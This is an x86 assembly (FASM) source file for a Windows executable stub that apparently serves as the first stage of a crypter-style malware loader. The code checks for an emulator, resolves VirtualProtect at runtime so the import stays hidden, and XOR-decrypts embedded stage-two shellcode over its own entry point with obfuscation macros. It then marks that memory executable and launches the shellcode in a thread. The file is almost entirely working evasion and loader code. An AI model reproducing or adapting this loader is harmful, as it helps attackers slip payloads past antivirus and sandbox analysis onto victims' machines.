format PE GUI 4.0
entry start

include 'win32wx.inc'
include 'nt.inc'

section '.text' code readable executable

start:
	stdcall	Main
	invoke	ExitProcess, 0
	ret

; Stage 2 shellcode
; When decrypting, must be written to the very beginning for the position independent shellcode to correctly resolve absolute addresses.
; This works, because Stub.exe and Stage2.exe both have the same image base address.

include 'Stage2Shellcode.inc'

proc Main
	local	String[100]:WORD
	local	Kernel32Handle:DWORD
	local	VirtualProtectPtr:DWORD
	local	OldProtect:DWORD
	local	ThreadParameter:DWORD

	; Detect emulator
	stdcall	DetectEmulator

	; Get module handle of kernel32.dll
	lea		eax, [String]
	lodstrw	'kernel32.dll'
	invoke	GetModuleHandleW, eax
	mov		[Kernel32Handle], eax

	; Get pointer of VirtualProtect
	lea		eax, [String]
	lodstra	'VirtualProtect'
	invoke	GetProcAddress, [Kernel32Handle], eax
	mov		[VirtualProtectPtr], eax

	; Change protection of stage2 to RW
	lea		eax, [OldProtect]
	stdcall	[VirtualProtectPtr], start, Stage2Size, PAGE_READWRITE, eax

	; Decrypt stage2
	mov		edi, start
	mov		esi, Stage2Shellcode
	mov		ecx, Stage2Size
	mov		edx, Stage2Key
	mov		ebx, Stage2PaddingMask
	cld
	obfoff ; Minimal obfuscation during stage 2 decrytion (due to performance)
.L_decrypt_stage2:
	lodsb
	xor		al, dl
	stosb
	ror		edx, 5
	imul	edx, 7
	test	ebx, 1
	jz		@f
	add		esi, Stage2PaddingByteCount
@@:	ror		ebx, 1
	dec		ecx
	test	ecx, ecx
	jnz		.L_decrypt_stage2
	obfon ; Re-activate obfuscation

	; Change protection of stage2 back to RX
	lea		eax, [OldProtect]
	stdcall	[VirtualProtectPtr], start, Stage2Size, PAGE_EXECUTE_READ, eax

	; Execute decrypted stage 2 shellcode
	lea		eax, [ThreadParameter]
	invoke	CreateThread, NULL, 0, start, eax, 0, NULL
@@:
	invoke	Sleep, 1000
	jmp		@b

.ret:
	invoke	ExitProcess, 0
	ret
endp

include 'Emulator.asm'



section '.idata' import data readable writeable
	library \
		kernel32, 'kernel32.dll', \
		shlwapi, 'Shlwapi.dll', \
		msvcrt, 'msvcrt.dll'
	include 'api\kernel32.inc'
	include 'api\shlwapi.inc'
	include 'api\msvcrt.inc'



;{RSRC}